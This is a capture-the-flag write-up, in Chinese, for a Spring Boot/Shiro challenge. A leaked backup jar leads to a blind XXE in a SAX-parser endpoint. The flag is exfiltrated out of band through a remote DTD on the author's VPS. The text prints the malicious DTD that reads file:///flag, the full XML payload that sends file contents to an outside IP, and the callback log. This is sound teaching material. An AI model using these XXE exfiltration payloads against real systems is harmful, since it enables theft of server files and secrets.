# Active

## Flag

本次实例拿到的 flag：

`flag{1937299b-3159-433b-ae77-65221a989739}`

这题是动态实例，重新下发后 flag 会变化，但利用链不变。

## 信息收集

先访问首页：

```text
GET /
```

页面底部直接给出指纹：

```text
powerd by Shiro & Springboot
```

然后用目录扫描，能扫到关键路径：

- `/403`
- `/backup`
- `/error`

其中 `/backup` 最关键：

```text
GET /backup
Content-Disposition: attachment; filename=back.jar
```

说明站点直接泄露了 Spring Boot 的备份包 `back.jar`。

## 备份包分析

把 `back.jar` 拉下来后，能看到几个关键类：

- `com.ctf.activetest.demos.web.UserController`
- `com.ctf.activetest.demos.web.MyFilter`
- `com.ctf.activetest.demos.web.MyShiroFilterFactoryBean`

以及模板：

- `templates/index.html`
- `templates/admin.html`
- `templates/success.html`
- `templates/error.html`

反编译后能得到几个核心信息。

### 1. `/permit/.*` 被 Shiro 自定义过滤器保护

`MyShiroFilterFactoryBean` 里把 `myFilter` 挂到了：

```text
/permit/.*
```

### 2. 过滤器只检查一个请求头

`MyFilter` 的逻辑很简单：

```java
String token = request.getHeader("AccessToken");
return token != null && token.equals("faketoken");
```

也就是理论上访问 `/permit/...` 时，只要带：

```text
AccessToken: faketoken
```

就能过。

### 3. `admin.html` 暴露了真实业务入口

`admin.html` 明确提示：

```text
POST /parse/sax-parser
```

这就是后面的核心攻击面。

## 实际打点结论

虽然代码里 `/permit/.*` 只需要 `AccessToken: faketoken`，但线上直接访问 `/permit/test` 还是会被 302 到 `/403`。这条线没必要继续深挖，因为真正的解析接口可以直接访问：

```text
GET /parse/sax-parser  -> 405
Allow: POST
```

说明该接口本身就在外面，不需要先进后台。

## 漏洞确认：`/parse/sax-parser` 存在 XXE

先按 `admin.html` 给的样例结构发一个正常 XML，接口会返回成功页面：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<financialReport>
    <company>
        <name>A</name>
        <tickerSymbol>B</tickerSymbol>
    </company>
    <report>
        <date>2024-08-03</date>
        <type>T</type>
        <revenue>
            <amount currency="USD">1</amount>
            <description>X</description>
        </revenue>
        <expenses>
            <amount currency="USD">2</amount>
            <description>Y</description>
        </expenses>
        <netIncome>
            <amount currency="USD">3</amount>
            <description>Z</description>
        </netIncome>
    </report>
</financialReport>
```

接着测试内部实体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE financialReport [
<!ENTITY test "HELLO">
]>
<financialReport>
    <company>
        <name>&test;</name>
        <tickerSymbol>B</tickerSymbol>
    </company>
    <report>
        <date>2024-08-03</date>
        <type>T</type>
        <revenue><amount currency="USD">1</amount><description>X</description></revenue>
        <expenses><amount currency="USD">2</amount><description>Y</description></expenses>
        <netIncome><amount currency="USD">3</amount><description>Z</description></netIncome>
    </report>
</financialReport>
```

接口仍然返回 success，说明 `DOCTYPE` 和实体解析都开着。

再测试本地文件实体：

```xml
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```

依然能成功。

再测试外部实体：

```xml
<!ENTITY xxe SYSTEM "http://example.com/">
```

接口会卡住或返回错误页，说明这是一个 **blind XXE**，而且可以访问外部 HTTP 资源。

## 利用思路

因为页面本身不回显文件内容，所以需要 OOB 外带。

最稳的做法是自己准备一个 HTTP 服务，提供远程 DTD，并在日志里接收回传内容。这里我直接用了自己的 VPS `116.62.211.91`，在 `80` 端口临时挂了两个路径：

- `/xxe.dtd`
- `/xxe_leak/...`

之所以直接用裸 IP，而不是域名或 HTTPS，是为了避免目标机出网时遇到 DNS/TLS 问题。

## 恶意 DTD

DTD 内容如下：

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://116.62.211.91/xxe_leak/%file;'>">
%eval;
```

它的作用是：

1. 读取 `file:///flag`
2. 把文件内容拼进一个新的外部实体 URL
3. 让目标主动请求：

```text
http://116.62.211.91/xxe_leak/<flag内容>
```

## 最终 Payload

请求体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE financialReport [
<!ENTITY % remote SYSTEM "http://116.62.211.91/xxe.dtd">
%remote;
]>
<financialReport>
    <company>
        <name>&exfil;</name>
        <tickerSymbol>B</tickerSymbol>
    </company>
    <report>
        <date>1</date>
        <type>2</type>
        <revenue><amount currency="U">1</amount><description>X</description></revenue>
        <expenses><amount currency="U">2</amount><description>Y</description></expenses>
        <netIncome><amount currency="U">3</amount><description>Z</description></netIncome>
    </report>
</financialReport>
```

发送：

```text
POST /parse/sax-parser
Content-Type: application/xml
```

## 回连结果

VPS 日志里可以看到目标机主动请求：

```text
GET /xxe_leak/flag{1937299b-3159-433b-ae77-65221a989739} HTTP/1.1
User-Agent: Java/11.0.13
```

直接拿到 flag：

```text
flag{1937299b-3159-433b-ae77-65221a989739}
```

## 总结

这题的完整利用链很短：

1. 扫目录发现 `/backup`
2. 下载 `back.jar` 做静态分析
3. 从 `admin.html` 找到 `POST /parse/sax-parser`
4. 确认 SAX 解析器开启了 `DOCTYPE` 和外部实体
5. 用 blind XXE + 远程 DTD 读取 `file:///flag`

核心点不是 Shiro 绕过，而是：

- 备份包泄露
- XML 解析器 XXE
- blind OOB 外带
